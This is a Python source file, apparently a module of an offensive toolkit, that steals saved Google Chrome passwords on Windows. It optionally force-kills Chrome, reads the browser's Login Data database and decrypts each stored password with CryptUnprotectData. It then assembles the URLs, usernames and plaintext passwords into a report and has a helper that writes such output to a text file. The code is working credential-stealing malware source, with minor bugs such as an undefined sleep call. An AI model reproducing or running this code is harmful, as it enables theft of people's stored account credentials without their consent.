# -*- coding: utf-8 -*-


# Based on original work from: www.dumpzilla.org

import os
import csv
import sys
import json
import psutil
import sqlite3

from shutil import copy
from termcolor import colored
from win32crypt import CryptUnprotectData
from subprocess import check_output, PIPE, Popen


#version= sys.version_info
#if version[0]== 2:
#    py2= True
#    py3= False
#    import config
#elif version[0]== 3:
#    py2= False
#    py3= True
#   from . import config

#try:
#    print (config.drop_type)
#    print ('The first')
#except:
#    print (drop_type)
#    print ('The second')



# Google Chrome Dump.

#task =str.encode('tasklist')

# //////////// Output text file writer.
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def txt_output_method(raw_msg):
    print ('[?] Extracting encrypted mozilla credentials....')
    sleep(0.8)
    print ('[?] Decrypting mozilla credentials....')
    sleep(0.8)
    print ('[?] Writting to text file....')

    if os.path.isfile('Fang-[Mozilla Pass].txt'):
        with open('Fang-[Mozilla Pass].txt','w') as txt_output:
            txt_output.write(raw_msg.strip())
               
    else :
        with open('Fang-[Mozilla Pass].txt','w') as txt_output:
            txt_output.write(raw_msg.strip())

    sleep (0.8)
    print ('\n')
    print("[+] Data written to Fang-[Mozilla Pass].txt")
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


def check():
	processes= str(psutil.process_iter())
	if 'chrome.exe' in processes:
		return True

def chromedump(arg):
    try:
        arg= arg
        #arg = arg.split(' ', 1)[1]
        msg = ''
        raw_msg= ''

        if arg == 'active':
            os.system('taskkill /f /im chrome.exe')
            #msg += ' [+] Killed chrome process\n\n'
            raw_msg += ' \n\n[+] Killed chrome process\n\n.'
        elif arg == 'passive':
            #if 'chrome.exe' in check_output('tasklist'):
            if check()== 'True':
                #print(ERROR+'Chrome is currently running, this module will not do anything until chrome stops')
               #return
               pass
        else:
            #raise IndexError
            #return
            pass
        info_list = []
        connection = sqlite3.connect(os.getenv('localappdata') + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\' + 'Login Data')
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()
        for origin_url, username, password in value:    
            password = CryptUnprotectData(
                password, None, None, None, 0)[1]
            if password:
                info_list.append({
                    u'origin_url': origin_url,
                    u'username': username,
                    u'password': bytes.decode(password)
                })
        #boundry= colored('| ---- | ','red')
        #Username= colored('Username: ','cyan')
        #urlss= colored('URL     : ','green')
        #password= colored('Password: ','cyan')
        #msg += colored('<[--Dumped-Passwords-<<Chrome>>--]>\n======================================= \n','green')
        raw_msg += '<[--Dumped-Passwords-<<Chrome>>--]>\n======================================= \n'
        if not info_list:
            #msg += '\n[-] No passwords present'
            raw_msg += '\n[-] No passwords present'
        else:
            for creds in info_list:
                pass
                #msg += u'\n{} {} {}' .format(boundry, urlss, creds['origin_url'].encode('ascii','ignore'))
                #msg += u'\n{} {} {}' .format(boundry, Username, creds['username'].encode('ascii','ignore'))
                #msg += u'\n{} {} {}' .format(boundry, password, creds['password'].encode('ascii','ignore'))
                #msg += u'\n{}'.format(boundry)
       
                raw_msg += u'\n| ---- | URL     : {}'.format(creds['origin_url'])#.encode('ascii','ignore'))
                raw_msg += u'\n| ---- | Username: {}'.format(creds['username'])#.encode('ascii','ignore'))
                raw_msg += u'\n| ---- | Password: {}'.format(creds['password'])#.encode('ascii','ignore'))
                raw_msg += u'\n| ---- | '
        #if py2:
        #    if 'plain' in config.drop_type:
        #        print (msg)
        #        return
        #    elif 'txt' in config.drop_type:
        #        txt_output_method(raw_msg)
        #elif py3:
        #    if 'plain' in drop_type:
        #        print (msg)
        #        return
        #    elif 'txt' in drop_type:
        #        txt_output_method(raw_msg)
        #        return
                #print (raw_msg)

        return (raw_msg)

    except Exception as crm_erro:
        print ('\n')
        print ('[-] Unable to recover chrome credentials\nReason: {}'.format(str(crm_erro)))

# Options ['active'/'passive']